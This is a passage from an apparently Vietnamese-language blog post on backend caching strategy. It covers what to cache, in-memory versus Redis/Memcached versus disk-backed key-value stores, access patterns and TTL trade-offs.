x\u00e1c \u0111\u1ecbnh c\u1ea7n cache c\u00e1i g\u00ec ch\u00ednh l\u00e0:\n\n- **T\u1ed1n nhi\u1ec1u time / resource**\n- **K\u1ebft qu\u1ea3 d\u00f9ng l\u1ea1i \u0111\u01b0\u1ee3c nhi\u1ec1u l\u1ea7n**\n\n1 y\u1ebfu t\u1ed1 ph\u1ee5 ph\u1ea3i c\u00e2n nh\u1eafc \u0111\u00f3 l\u00e0:\n\n- **M\u1ee9c \u0111\u1ed9 ch\u1ea5p nh\u1eadn sai l\u1ec7ch d\u1eef li\u1ec7u:** Sau khi data c\u1ee7a b\u1ea1n th\u1ecfa m\u00e3n 2 c\u00e2u h\u1ecfi tr\u00ean, th\u00ec li\u1ec7u b\u1ea1n c\u00f3 ch\u1ea5p nh\u1eadn vi\u1ec7c sai s\u1ed1 do d\u00f9ng cache hay kh\u00f4ng?\n\nC\u1ee5 th\u1ec3 h\u01a1n, **t\u1ed1n nhi\u1ec1u time / resource** \u1edf \u0111\u00e2y ch\u00ednh l\u00e0 vi\u1ec7c \u0111\u1ec3 t\u00ednh to\u00e1n ra 1 k\u1ebft qu\u1ea3 th\u00ec application c\u1ee7a ch\u00fang ta ph\u1ea3i **t\u1ed1n time**, **CPU usage**, **disk iops**, **network banwidth**, **file descriptor**,... v\u00e0 vi\u1ec7c cache c\u1ee7a ch\u00fang ta s\u1ebd gi\u00fap gi\u1ea3m \u0111\u01b0\u1ee3c th\u1eddi gian c\u0169ng nh\u01b0 t\u00e0i nguy\u00ean ti\u00eau t\u1ed1n cho vi\u1ec7c t\u00ednh to\u00e1n l\u1ea1i.\n\nC\u00f2n **k\u1ebft qu\u1ea3 d\u00f9ng l\u1ea1i \u0111\u01b0\u1ee3c nhi\u1ec1u l\u1ea7n** t\u1ee9c l\u00e0 k\u1ebft qu\u1ea3 m\u00e0 ch\u00fang ta cache ph\u1ea3i \u0111\u01b0\u1ee3c s\u1eed d\u1ee5ng l\u1ea1i th\u00ec m\u1edbi n\u00ean cache. N\u1ebfu data \u0111\u01b0\u1ee3c cache m\u00e0 kh\u00f4ng bao gi\u1edd \u0111\u01b0\u1ee3c d\u00f9ng l\u1ea1i, ho\u1eb7c d\u00f9ng l\u1ea1i v\u1edbi t\u1ef7 l\u1ec7 qu\u00e1 th\u1ea5p ki\u1ec3u 50% hit ratio th\u00ec h\u1ec7 th\u1ed1ng cache c\u1ee7a ch\u00fang ta \u0111ang l\u00e0m \u0111i\u1ec1u v\u00f4 ngh\u0129a.\n\n### Ph\u00e2n t\u00edch theo chi\u1ec1u d\u1ecdc\n\nTr\u1edb tr\u00eau thay 2 c\u00e2u h\u1ecfi n\u00e0y l\u1ea1i c\u00f3 xu h\u01b0\u1edbng gi\u1edbi t\u00ednh tr\u00e1i ng\u01b0\u1ee3c nhau. H\u00e3y c\u00f9ng xem l\u01b0\u1ee3c \u0111\u1ed3 request **theo chi\u1ec1u d\u1ecdc nh\u01b0 sau**:\n\n![](https://images.viblo.asia/405aff98-9ef1-466f-a254-a9d6b2ac1349.png)\n\n\u0110i t\u1eeb tr\u00ean xu\u1ed1ng d\u01b0\u1edbi ch\u00ednh l\u00e0 vi\u1ec7c m\u00ecnh \u0111\u00e0o s\u00e2u v\u00e0o 1 request, l\u1edbp \u1edf tr\u00ean ch\u1ee9a k\u1ebft qu\u1ea3 l\u1edbp \u1edf d\u01b0\u1edbi. C\u00e0ng xu\u1ed1ng s\u00e2u th\u00ec latency / resource c\u00e0ng c\u1ea7n \u00edt h\u01a1n v\u00e0 m\u1ee9c \u0111\u1ed9 reuse \u0111\u01b0\u1ee3c d\u1eef li\u1ec7u c\u0169ng t\u0103ng l\u00ean. Do \u0111\u00f3 xu h\u01b0\u1edbng c\u1ee7a m\u00ecnh s\u1ebd l\u00e0:\n\n- **C\u00e0ng cache l\u1edbp \u1edf tr\u00ean c\u00e0ng t\u1ed1t cho h\u1ec7 th\u1ed1ng**: \u0110\u00e2y ch\u00ednh l\u00e0 vi\u1ec7c nhanh ch\u00f3ng k\u1ebft th\u00fac request v\u00e0 tr\u1ea3 v\u1ec1 k\u1ebft qu\u1ea3\n- **C\u1ed1 g\u1eafng mang t\u00ednh ch\u1ea5t l\u1edbp d\u01b0\u1edbi l\u00ean l\u1edbp tr\u00ean**: Ch\u00ednh l\u00e0 vi\u1ec7c \u0111\u01b0a d\u1ea7n t\u00ednh ch\u1ea5t static data / shared data l\u00ean tr\u00ean.\n\nV\u00ed d\u1ee5, v\u1edbi 1 trang blog, c\u00e1c b\u1ea1n \u0111i theo chi\u1ec1u d\u1ecdc s\u1ebd \u0111\u01b0\u1ee3c t\u01b0\u01a1ng \u1ee9ng l\u00e0:\n\n![](https://images.viblo.asia/04b8f621-890e-43c7-9892-5b7d74b5c616.png)\n\nH\u01b0\u1edbng m\u0169i t\u00ean ch\u00ednh l\u00e0 h\u01b0\u1edbng ch\u1ec9 kh\u1ea3 n\u0103ng cache d\u1ec5 d\u1ea7n, nh\u01b0ng c\u0169ng khi\u1ebfn cho gi\u00e1 tr\u1ecb cache \u0111em l\u1ea1i gi\u1ea3m d\u1ea7n (v\u00ec th\u1eddi gian ti\u1ebft ki\u1ec7m cho 1 request s\u1ebd gi\u1ea3m \u0111i). T\u00f9y thu\u1ed9c v\u00e0o m\u1ee9c \u0111\u1ed9 ch\u1ea5p nh\u1eadn sai s\u1ed1 trong d\u1eef li\u1ec7u v\u00e0 y\u00eau c\u1ea7u t\u1eeb traffic m\u00e0 c\u00e1c b\u1ea1n ch\u1ecdn 1 t\u1ea7ng cache c\u1ee5 th\u1ec3.\n\n- N\u1ebfu trang blog c\u1ee7a m\u00ecnh l\u00e8o t\u00e8o v\u00e0i m\u1ed1ng, m\u00ecnh c\u00f3 th\u1ec3 ch\u1ec9 c\u1ea7n cache \u1edf site config hay content data th\u00f4i.\n- N\u1ebfu trang blog c\u1ee7a m\u00ecnh hot nh\u01b0 MV c\u1ee7a S\u1ebfp, m\u00ecnh c\u00f3 th\u1ec3 c\u00e2n nh\u1eafc cache Full HTML ho\u1eb7c Body page v\u00e0 ch\u1ea5p nh\u1eadn c\u00f3 sai s\u1ed1 trong dynamic data nh\u01b0 liked data.\n\n> Ph\u00e2n t\u00edch theo chi\u1ec1u d\u1ecdc gi\u00fap b\u1ea1n ch\u1ecdn 1 level \u0111\u1ec3 cache c\u1ee5 th\u1ec3. Vi\u1ec7c cache nhi\u1ec1u level th\u00ec c\u0169ng ok, nh\u01b0ng s\u1ebd g\u00e2y tr\u00f9ng l\u1eb7p d\u1eef li\u1ec7u v\u00e0 c\u0169ng kh\u00f4ng c\u1ea7n thi\u1ebft do level \u1edf tr\u00ean \u0111\u00e3 cover \u0111\u01b0\u1ee3c cho level th\u1ea5p r\u1ed3i.\n\n### Ph\u00e2n t\u00edch theo chi\u1ec1u ngang\n\nV\u1eabn ti\u1ebfp t\u1ee5c b\u00e1m theo 2 c\u00e2u h\u1ecfi tr\u00ean, nh\u01b0ng m\u00ecnh l\u1ea1i ph\u00e2n t\u00edch request c\u1ee7a m\u00ecnh theo chi\u1ec1u ngang th\u00ec sao?\n\n![](https://images.viblo.asia/9f7befe9-fd8a-41f6-a076-e9b14ab50d16.png)\n\n\nNh\u01b0 c\u00e1c b\u1ea1n th\u1ea5y, v\u1edbi 1 trang web hay 1 request m\u00ecnh s\u1ebd b\u00f3c t\u00e1ch n\u00f3 th\u00e0nh c\u00e1c th\u00e0nh ph\u1ea7n ngang h\u00e0ng d\u1ef1a tr\u00ean t\u00ednh ch\u1ea5t generic / specific, t\u1ee9c l\u00e0 d\u1eef li\u1ec7u chung hay ri\u00eang.\n\nV\u00ed d\u1ee5 v\u1eabn l\u00e0 trang blog tr\u00ean, nh\u01b0ng m\u00ecnh s\u1ebd t\u00e1ch n\u00f3 th\u00e0nh c\u00e1c th\u00e0nh ph\u1ea7n nh\u01b0 sau:\n\n![](https://images.viblo.asia/144e1a77-ac94-4434-96d3-9ad3fe6f6fc5.png)\n\nC\u1ee5 th\u1ec3 h\u01a1n:\n\n- Header, footer (config c\u1ea3 trang)\n- Top b\u00e0i vi\u1ebft h\u00f4m nay (sidebar b\u00ean c\u1ea1nh)\n- N\u1ed9i dung b\u00e0i vi\u1ebft (body)\n- Th\u00f4ng tin current user (hi\u1ec3n th\u1ecb \u1edf g\u00f3c g\u00f3c)\n- Th\u00f4ng tin c\u1ee7a user li\u00ean quan \u0111\u1ebfn b\u00e0i vi\u1ebft hi\u1ec7n t\u1ea1i (\u0111\u00e3 \u0111\u1ecdc, like, comment,...)\n\n\u00c1p nh\u1eefng ti\u00eau ch\u00ed m\u00ecnh v\u1eeba n\u00eau \u1edf tr\u00ean v\u00e0o, h\u01b0\u1edbng m\u0169i t\u00ean ch\u00ednh l\u00e0 h\u01b0\u1edbng ch\u1ec9 kh\u1ea3 n\u0103ng cache d\u1ec5 d\u1ea7n. \u1ede \u0111\u00e2y v\u00ec \u0111\u01b0\u1ee3c t\u00e1ch theo chi\u1ec1u ngang, do \u0111\u00f3 c\u00e1c b\u1ea1n c\u00f3 th\u1ec3 cache ri\u00eang t\u1eebng ph\u1ea7n tu\u1ef3 theo \u0111\u1eb7c \u0111i\u1ec3m d\u1eef li\u1ec7u c\u1ee7a c\u00e1c b\u1ea1n. Ngo\u00e0i ra vi\u1ec7c t\u00e1ch request theo chi\u1ec1u ngang gi\u00fap m\u1ecdi ng\u01b0\u1eddi c\u00f3 th\u1ec3 \u0111\u00e1nh gi\u00e1 \u0111\u00e2u l\u00e0 ph\u1ea7n chi\u1ebfm nhi\u1ec1u t\u00e0i nguy\u00ean / latency time nh\u1ea5t v\u00e0 \u0111\u00e2u l\u00e0 ph\u1ea7n \u0111\u01b0\u1ee3c s\u1eed d\u1ee5ng l\u1ea1i nhi\u1ec1u nh\u1ea5t. T\u1eeb \u0111\u00f3 s\u1ebd d\u1ec5 x\u00e1c \u0111\u1ecbnh vi\u1ec7c m\u00ecnh c\u00f3 c\u1ea7n cache c\u00e1i n\u00e0y kh\u00f4ng:\n\n- N\u1ebfu ph\u1ea7n article body chi\u1ebfm 100ms, nh\u01b0ng \u0111\u01b0\u1ee3c d\u00f9ng chung nhi\u1ec1u l\u1ea7n ~> n\u00ean cache\n- N\u1ebfu ph\u1ea7n user info chi\u1ebfm 120ms, nh\u01b0ng r\u1ea5t \u00edt d\u00f9ng (do trang to\u00e0n guest ch\u1eb3ng h\u1ea1n) ~> ch\u01b0a c\u1ea7n cache\n\n> Ph\u00e2n t\u00edch theo chi\u1ec1u ngang gi\u00fap b\u1ea1n t\u00e1ch 1 request th\u00e0nh nhi\u1ec1u th\u00e0nh ph\u1ea7n c\u00f3 th\u1ec3 cache kh\u00e1c nhau (th\u01b0\u1eddng l\u00e0 s\u1ebd thay \u0111\u1ed5i n\u01a1i l\u01b0u cache + th\u1eddi gian TTL)\n\n## N\u1ebfu c\u1ea7n cache th\u00ec cache \u1edf \u0111\u00e2u?\n\nV\u00ec b\u00e0i vi\u1ebft n\u00e0y ch\u1ec9 \u0111i s\u00e2u v\u00e0o khu v\u1ef1c cache t\u1ea1i backend application. Do \u0111\u00f3 m\u00ecnh s\u1ebd ch\u1ec9 li\u1ec7t k\u00ea c\u00e1c storage cache d\u00e0nh cho backend application m\u00e0 m\u1ecdi ng\u01b0\u1eddi hay g\u1eb7p m\u00e0 th\u00f4i.\n\n![](https://images.viblo.asia/7b295ff9-c871-4aae-9fa3-fdb0a4f1d2ed.png)\n\nC\u1ee5 th\u1ec3 h\u01a1n:\n\nN\u1ebfu l\u01b0u data tr\u00ean ch\u00ednh server ch\u1ea1y code th\u00ec c\u00f3 2 lo\u1ea1i:\n\n**Memory (in-process)** l\u00e0 l\u01b0u data lu\u00f4n v\u00e0o variable c\u1ee7a process ch\u1ea1y \u1ee9ng d\u1ee5ng. Ki\u1ec3u l\u01b0u c\u00f3 th\u1ec3 l\u00e0 d\u1ea1ng array, hashmap,...\n\n- L\u01b0u tr\u1ef1c ti\u1ebfp data type m\u00e0 kh\u00f4ng c\u1ea7n serialize.\n- Insanely fast.\n- Ph\u00f9 h\u1ee3p v\u1edbi \u1ee9ng d\u1ee5ng c\u00f3 process chung v\u00e0 share \u0111\u01b0\u1ee3c memory gi\u1eefa c\u00e1c request. \u0110a s\u1ed1 ng\u00f4n ng\u1eef ch\u1ea1y ki\u1ec3u n\u00e0y nh\u01b0 nodejs, python, java, .net,...\n- Ph\u00f9 h\u1ee3p v\u1edbi data c\u00f3 \u0111\u1ed9 tr\u1ec5 r\u1ea5t th\u1ea5p v\u00e0 t\u1ea7n su\u1ea5t truy c\u1eadp l\u1edbn, dung l\u01b0\u1ee3ng nh\u1ecf, c\u00f3 gi\u1edbi h\u1ea1n v\u00e0 bi\u1ebft tr\u01b0\u1edbc, \u1ee9ng d\u1ee5ng ti\u1ebft ki\u1ec7m t\u1edbi c\u1ea3 CPU \u0111\u1ec3 t\u00ednh to\u00e1n. \u0110\u1ed9 tr\u1ec5 c\u1ee7a data d\u1ea1ng n\u00e0y th\u01b0\u1eddng \u1edf m\u1ee9c < 1ms\n\nC\u00e1c lo\u1ea1i data m\u00ecnh hay l\u01b0u trong memory:\n\n- Configuration (t\u1eeb DB ho\u1eb7c HTTP endpoint)\n- Common data m\u00e0 t\u1ea5t c\u1ea3 c\u00e1c request \u0111\u1ec1u c\u1ea7n\n- K\u1ebft qu\u1ea3 parse user agent, th\u00f4ng tin token,... th\u01b0\u1eddng xuy\u00ean ph\u1ea3i l\u1ea5y t\u1eeb request\n\n**Local file** l\u00e0 l\u01b0u data v\u00e0o file tr\u1ef1c ti\u1ebfp tr\u00ean server. L\u01b0u ki\u1ec3u string ho\u1eb7c binary\n\n- C\u1ea7n qua 1 b\u01b0\u1edbc serialize\n- Fast (nh\u01b0ng b\u1ecb ph\u1ee5 thu\u1ed9c nhi\u1ec1u v\u00e0o t\u1ed1c \u0111\u1ed9 local disk)\n- Ph\u00f9 h\u1ee3p v\u1edbi \u1ee9ng d\u1ee5ng kh\u00f4ng c\u00f3 process chung ho\u1eb7c kh\u00f4ng share memory nh\u01b0 \u1ee9ng d\u1ee5ng vi\u1ebft b\u1eb1ng PHP.\n- Ph\u00f9 h\u1ee3p v\u1edbi \u1ee9ng d\u1ee5ng ch\u1ea1y tr\u1ef1c ti\u1ebfp tr\u00ean VM, bare metal.\n- Ph\u00f9 h\u1ee3p v\u1edbi giai \u0111o\u1ea1n s\u1edbm c\u1ee7a vi\u1ec7c ph\u00e1t tri\u1ec3n (m\u1edbi b\u1eaft \u0111\u1ea7u d\u00f9ng cache) ho\u1eb7c sau n\u00e0y c\u00f3 m\u1ee5c \u0111\u00edch \u0111\u1eb7c bi\u1ec7t\n- Ph\u00f9 h\u1ee3p v\u1edbi data l\u1edbn h\u01a1n ho\u1eb7c native v\u1edbi file (nh\u01b0 html, css, js, image, video,... \u0111\u1ed9ng)\n\nC\u00e1c lo\u1ea1i data m\u00ecnh hay l\u01b0u file:\n\n- Static asset cache\n- Session data\n- Full page HTML, template view,...\n\nVi\u1ec7c t\u1ef1 l\u01b0u data tr\u00ean server code nh\u01b0 tr\u00ean c\u00f3 \u01b0u \u0111i\u1ec3m l\u00e0 r\u1ea5t nhanh, tuy nhi\u00ean ch\u1ec9 ph\u00f9 h\u1ee3p v\u1edbi \u1ee9ng d\u1ee5ng c\u00f3 \u00edt instance ho\u1eb7c c\u00e1c instance \u1edf r\u1ea5t xa v\u00e0 \u00edt li\u00ean h\u1ec7 v\u1edbi nhau. Kh\u1ea3 n\u0103ng m\u1edf r\u1ed9ng b\u1ed9 nh\u1edb b\u1ecb gi\u1edbi h\u1ea1n trong ph\u1ea1m vi 1 node v\u00e0 hi\u1ec7u qu\u1ea3 cache (hit/miss ratio) s\u1ebd tr\u1edf th\u00e0nh v\u1ea5n \u0111\u1ec1 trong c\u00e1c h\u1ec7 th\u1ed1ng nhi\u1ec1u node.\n\nN\u1ebfu s\u1eed d\u1ee5ng c\u00e1c gi\u1ea3i ph\u00e1p remote qua network th\u00ec c\u0169ng c\u00f3 2 lo\u1ea1i:\n\n**Remote memory storage** l\u00e0 c\u00e1c gi\u1ea3i ph\u00e1p c\u1ee7a b\u00ean th\u1ee9 3 l\u01b0u data tr\u1ef1c ti\u1ebfp tr\u00ean memory nh\u01b0 redis, memcache,...\n\n- Cung c\u1ea5p 1 s\u1ed1 lo\u1ea1i data c\u01a1 b\u1ea3n\n- Fast (nh\u01b0ng b\u1ecb ph\u1ee5 thu\u1ed9c v\u00e0o t\u1ed1c \u0111\u1ed9 network)\n- Ph\u00f9 h\u1ee3p v\u1edbi ph\u1ea7n l\u1edbn c\u00e1c ki\u1ec3u \u1ee9ng d\u1ee5ng\n- D\u1ec5 d\u00e0ng m\u1edf r\u1ed9ng m\u00e0 kh\u00f4ng th\u1ea5t tho\u00e1t qu\u00e1 nhi\u1ec1u performance, kh\u00f4ng ph\u1ee5 thu\u1ed9c v\u00e0o s\u1ed1 l\u01b0\u1ee3ng server code. Latency c\u1ee7a data tr\u00ean c\u00e1c h\u1ec7 th\u1ed1ng cache n\u00e0y th\u01b0\u1eddng trong kho\u1ea3ng 1 ~> 10ms\n- Hi\u1ec7u qu\u1ea3 (hit/miss ratio) cao nh\u1edd vi\u1ec7c d\u00f9ng chung cache v\u1edbi nhi\u1ec1u server code\n- Ph\u00f9 h\u1ee3p v\u1edbi data t\u1eebng item nh\u1ecf v\u00ec limit dung l\u01b0\u1ee3ng RAM v\u00e0 vi\u1ec7c data l\u1edbn c\u0169ng g\u1eb7p bottleneck khi transfer qua network\n- Ph\u00f9 h\u1ee3p v\u1edbi data c\u00f3 TTL th\u1ea5p\n\n\u0110\u00e2y l\u00e0 lo\u1ea1i cache \u0111\u01b0\u1ee3c s\u1eed d\u1ee5ng r\u1ed9ng r\u00e3i nh\u1ea5t, do n\u00f3 \u0111\u00e1p \u1ee9ng \u0111\u01b0\u1ee3c nhi\u1ec1u nhu c\u1ea7u, t\u1ed1c \u0111\u1ed9 cao v\u1eeba ph\u1ea3i v\u00e0 kh\u1ea3 n\u0103ng m\u1edf r\u1ed9ng d\u1ec5 d\u00e0ng. Nh\u01b0ng b\u1ea3n ch\u1ea5t th\u00ec d\u00f9 c\u00f3 d\u00f9ng memory \u0111\u1ec3 store data th\u00ec c\u0169ng v\u1eabn m\u1ea5t **network latency** \u0111\u1ec3 truy\u1ec1n t\u1ea3i. H\u00e3y nh\u1edb \u0111i\u1ec1u \u0111\u00f3 v\u00e0 \u0111\u1eebng nh\u1ea7m l\u1eabn.\n\nC\u00e1c lo\u1ea1i data m\u00ecnh hay l\u01b0u tr\u00ean remote memory storage:\n\n- V\u1ec1 c\u01a1 b\u1ea3n l\u00e0 t\u1ea5t c\u1ea3 \u0111\u1ec1u c\u00f3 th\u1ec3 l\u01b0u \u0111\u01b0\u1ee3c =)))\n- Tr\u1eeb HTML page ho\u1eb7c c\u00e1c data n\u1eb7ng\n- Tr\u1eeb c\u00e1c lo\u1ea1i data c\u1ea7n super fast th\u00ec chuy\u1ec3n qua in-memory\n\n**Remote disk storage** l\u00e0 c\u00e1c gi\u1ea3i ph\u00e1p c\u1ee7a b\u00ean th\u1ee9 3 l\u01b0u data hybrid (memory + disk) ho\u1eb7c tr\u00ean disk, th\u01b0\u1eddng l\u00e0 c\u00e1c Key-value database nh\u01b0 aerospike, hazencast,...\n\n- Cung c\u1ea5p nhi\u1ec1u t\u00ednh n\u0103ng v\u00e0 ki\u1ec3u d\u1eef li\u1ec7u h\u01a1n\n- Fast ki\u1ec3u normal =))) M\u1ea5y th\u1eb1ng db n\u00e0y \u0111\u01b0\u1ee3c t\u1ed1i \u01b0u cho SSD c\u00e1c th\u1ee9, cho t\u1ed1c \u0111\u1ed9 nhanh h\u01a1n DB th\u01b0\u1eddng kh\u00e1 nhi\u1ec1u\n- D\u1ec5 d\u00e0ng m\u1edf r\u1ed9ng v\u1ec1 dung l\u01b0\u1ee3ng v\u00e0 s\u1ed1 l\u01b0\u1ee3ng node m\u00e0 v\u1eabn gi\u1eef performance \u1edf m\u1ee9c \u1ed5n\n- Ph\u00f9 h\u1ee3p v\u1edbi data c\u00f3 m\u1ee9c \u0111\u1ed9 m\u1edf r\u1ed9ng l\u1edbn v\u00e0 personalize nhi\u1ec1u do c\u00f3 l\u1ee3i th\u1ebf v\u1ec1 l\u01b0u tr\u1eef\n- Ph\u00f9 h\u1ee3p v\u1edbi c\u00e1c \u1ee9ng d\u1ee5ng c\u00f3 y\u00eau c\u1ea7u v\u1ec1 High Availability, Resiliency, auto failover... cao\n- Ph\u00f9 h\u1ee3p v\u1edbi data c\u00f3 TTL d\u00e0i\n\nC\u00e1c lo\u1ea1i data hay l\u01b0u tr\u00ean remote disk storage:\n\n- Personalize data (recommendation, advertising, tracking, analytic,...)\n\nV\u1ec1 c\u01a1 b\u1ea3n th\u00ec ch\u00fang ta c\u0169ng ch\u1ec9 hay g\u1eb7p 4 lo\u1ea1i storage ph\u00eda tr\u00ean m\u00e0 th\u00f4i. Th\u00f4ng th\u01b0\u1eddng n\u1ebfu l\u00e0 1 \u1ee9ng d\u1ee5ng nh\u1ecf th\u00ec vi\u1ec7c l\u1ef1a ch\u1ecdn cache storage n\u00f3 ch\u01b0a qu\u00e1 kinh kh\u1ee7ng. C\u1ee9 c\u00e1i g\u00ec ti\u1ec7n th\u00ec m\u1ecdi ng\u01b0\u1eddi d\u00f9ng lu\u00f4n th\u00f4i. V\u00ed d\u1ee5:\n\n- V\u1edbi ng\u00f4n ng\u1eef th\u00f4ng d\u1ecbch, kh\u00f4ng share memory nh\u01b0 PHP th\u00ec l\u1ef1a ch\u1ecdn ch\u1ee7 y\u1ebfu l\u00e0 **Local file** v\u00e0 **Network memory storage**. Tu\u1ef3 thu\u1ed9c v\u00e0o vi\u1ec7c ch\u1ea1y 1 instance hay multiple instance m\u00e0 ch\u1ecdn file ho\u1eb7c redis / memcached.\n- V\u1edbi ng\u00f4n ng\u1eef nh\u1eb9 nh\u00e0ng ki\u1ec3u nodejs, python, golang th\u00ec l\u1ef1a ch\u1ecdn ch\u1ee7 y\u1ebfu l\u00e0 **In memory** v\u00e0 **Network memory storage**. Tu\u1ef3 thu\u1ed9c v\u00e0o data l\u01b0u nh\u1ecf hay l\u1edbn. N\u1ebfu nh\u1ecf v\u00e0 d\u00f9ng nhi\u1ec1u th\u00ec c\u00f3 th\u1ec3 x\u00e0i in-memory, n\u1ebfu l\u1edbn v\u00e0 d\u00f9ng kh\u00f4ng qu\u00e1 nhi\u1ec1u th\u00ec ch\u1ecdn redis / memcached.\n- V\u1edbi ng\u00f4n ng\u1eef n\u1eb7ng n\u1ec1 ki\u1ec3u java, .net th\u00ec m\u00ecnh th\u1ea5y l\u1ef1a ch\u1ecdn ch\u1ee7 y\u1ebfu l\u00e0 **In memory** do t\u1eadn d\u1ee5ng \u0111\u01b0\u1ee3c kh\u1ea3 n\u0103ng qu\u1ea3n l\u00fd ph\u1ee9c t\u1ea1p datatype c\u1ee7a ng\u00f4n ng\u1eef c\u0169ng nh\u01b0 t\u1ed1c \u0111\u1ed9 c\u1ee7a server.\n\nTuy nhi\u00ean khi \u0111\u00e3 qua giai \u0111o\u1ea1n nh\u1ecf v\u00e0 b\u01b0\u1edbc \u0111\u1ebfn giai \u0111o\u1ea1n traffic l\u1edbn v\u1edbi y\u00eau c\u1ea7u ch\u1eb7t ch\u1ebd h\u01a1n th\u00ec vi\u1ec7c ch\u1ecdn n\u01a1i l\u01b0u cache c\u1ea7n \u0111\u01b0\u1ee3c t\u00ednh to\u00e1n k\u1ef9 c\u00e0ng. M\u00ecnh c\u00f3 1 s\u1ed1 kinh nghi\u1ec7m \u1edf \u0111\u00e2y nh\u01b0 sau:\n\n**X\u00e1c \u0111\u1ecbnh t\u00ednh ch\u1ea5t access d\u1eef li\u1ec7u**: hot-cold s\u1ebd ph\u00f9 h\u1ee3p v\u1edbi **local cache**. even-distributed s\u1ebd ph\u00f9 h\u1ee3p v\u1edbi **remote cache**.\n\nHot-cold t\u1ee9c l\u00e0 c\u00f3 nh\u1eefng item \u0111\u01b0\u1ee3c access r\u1ea5t nhi\u1ec1u l\u1ea7n, c\u00f3 nh\u1eefng item \u0111\u01b0\u1ee3c access r\u1ea5t \u00edt. Ki\u1ec3u l\u01b0u 1 key cho configuration v\u00e0 1 key cho user data ch\u1eb3ng h\u1ea1n. Do \u0111\u00f3 n\u1ebfu d\u00f9ng distributed cache nh\u01b0 redis cluster, memcached cluster th\u00ec vi\u1ec7c sharding d\u1eef li\u1ec7u gi\u1eefa c\u00e1c node s\u1ebd l\u00e0m cache c\u1ee7a ch\u00fang ta ph\u00e2n t\u1ea3i kh\u00f4ng \u0111\u1ec1u. Node ch\u1ee9a item hot \u0111\u01b0\u1ee3c access r\u1ea5t nhi\u1ec1u, node ch\u1ee9a item cold ch\u1ea3 \u0111\u01b0\u1ee3c access m\u1ea5y. Do \u0111\u00f3 s\u1ebd ph\u00f9 h\u1ee3p v\u1edbi **local cache** tr\u00ean memory v\u00e0 duplicated tr\u00ean c\u00e1c process.\n\nEven-distributed t\u1ee9c l\u00e0 c\u00e1c item c\u00f3 l\u01b0\u1ee3ng access \u0111\u1ed3ng \u0111\u1ec1u nhau. Ki\u1ec3u l\u01b0u 1 key cho t\u1eebng user. Ki\u1ec3u n\u00e0y n\u1ebfu d\u00f9ng local cache th\u00ec t\u1ef7 l\u1ec7 hit/miss s\u1ebd b\u1ecb gi\u1ea3m do vi\u1ec7c ph\u1ea3i duplicated data gi\u1eefa c\u00e1c server. Do \u0111\u00f3 hi\u1ec7u qu\u1ea3 cache s\u1ebd gi\u1ea3m xu\u1ed1ng. N\u1ebfu s\u1eed d\u1ee5ng **distributed remote cache** nh\u01b0 redis cluster, memcached cluster s\u1ebd ph\u00f9 h\u1ee3p h\u01a1n v\u00ec kh\u1ea3 n\u0103ng sharding v\u00e0 chia t\u1ea3i \u0111\u1ec1u h\u01a1n.\n\n**X\u00e1c \u0111\u1ecbnh l\u01b0\u1ee3ng d\u1eef li\u1ec7u**: \u00cdt, x\u00e1c \u0111\u1ecbnh \u0111\u01b0\u1ee3c tr\u01b0\u1edbc th\u00ec local c\u00f2n nhi\u1ec1u v\u00e0 kh\u00f4ng x\u00e1c \u0111\u1ecbnh tr\u01b0\u1edbc th\u00ec remote\n\n**X\u00e1c \u0111\u1ecbnh y\u00eau c\u1ea7u performance**: B\u00ecnh th\u01b0\u1eddng th\u00ec remote, si\u00eau nhanh th\u00ec local (nh\u01b0ng ph\u1ea3i c\u00f3 c\u00e1ch x\u1eed l\u00fd ph\u00f9 h\u1ee3p)\n\n## V\u00e0 cache bao l\u00e2u?\n\nCu\u1ed1i c\u00f9ng ch\u00ednh l\u00e0 c\u00e2u h\u1ecfi kh\u00f9 kho\u1eb1m o\u00e1i o\u0103m nh\u1ea5t n\u00e0y: **Cache trong bao l\u00e2u?** \u0110\u00e2y l\u00e0 c\u00e2u h\u1ecfi khoai nh\u1ea5t v\u00e0 c\u0169ng c\u1ea7n ch\u00fang ta \u0111\u1ed9ng n\u00e3o nhi\u1ec1u nh\u1ea5t. Nhi\u1ec1u khi ch\u1ecdn cache \u1edf memory hay \u1edf redis th\u00ec k\u1ebft qu\u1ea3 \u0111em l\u1ea1i cho h\u1ec7 th\u1ed1ng c\u1ee7a c\u00e1c b\u1ea1n ch\u01b0a nhi\u1ec1u b\u1eb1ng vi\u1ec7c set TTL cho h\u1ee3p l\u00fd. B\u1edfi v\u00ec cache bao l\u00e2u s\u1ebd \u1ea3nh h\u01b0\u1edfng tr\u1ef1c ti\u1ebfp t\u1edbi t\u00ednh \u0111\u00fang \u0111\u1eafn v\u00e0 hi\u1ec7u qu\u1ea3 cache c\u1ee7a c\u00e1c b\u1ea1n.\n\nH\u00e3y c\u00f9ng xem x\u00e9t l\u1ee3i h\u1ea1i c\u1ee7a vi\u1ec7c set TTL d\u00e0i hay ng\u1eafn:\n\n![](https://images.viblo.asia/15e63af9-8911-48dc-a505-fcddabd9ea9e.png)\n\n\u0110\u00e2y l\u00e0 2 \u0111\u1ed3 th\u1ecb \u0111\u01b0\u1ee3c m\u00ecnh m\u00f4 ph\u1ecfng m\u1ed1i quan h\u1ec7 gi\u1eefa vi\u1ec7c t\u0103ng cache TTL v\u1edbi **hi\u1ec7u qu\u1ea3 cache** \u0111o b\u1eb1ng hit ratio v\u00e0 **chi ph\u00ed cache** l\u00e0 storage size. \n\n- **Khi t\u0103ng cache TTL th\u00ec storage size s\u1ebd t\u0103ng**. Hi\u1ec3n nhi\u00ean r\u1ed3i.\n- **Khi t\u0103ng cache TTL th\u00ec hit ratio c\u0169ng s\u1ebd t\u0103ng**, tuy nhi\u00ean s\u1ebd kh\u00f4ng t\u0103ng tuy\u1ebfn t\u00ednh m\u00e0 s\u1ebd gi\u1ed1ng ki\u1ec3u \u0111\u1ed3 th\u1ecb \u0111ang mi\u00eau t\u1ea3. C\u00e0ng v\u1ec1 sau th\u00ec vi\u1ec7c t\u0103ng cache TTL c\u00e0ng kh\u00f4ng c\u1ea3i thi\u1ec7n nhi\u1ec1u t\u1ef7 l\u1ec7 cache hit.\n\nNgo\u00e0i ra \u1edf \u0111\u00e2y c\u00f2n c\u00f3 1 v\u1ea5n \u0111\u1ec1 ch\u01b0a nh\u1eafc t\u1edbi \u0111\u00f3 ch\u00ednh l\u00e0 t\u00ednh \u0111\u00fang \u0111\u1eafn c\u1ee7a d\u1eef li\u1ec7u s\u1ebd gi\u1ea3m \u0111i v\u1edbi th\u1eddi gian cache c\u00e0ng d\u00e0i. C\u00e1i n\u00e0y m\u00ecnh kh\u00f4ng bi\u1ec3u 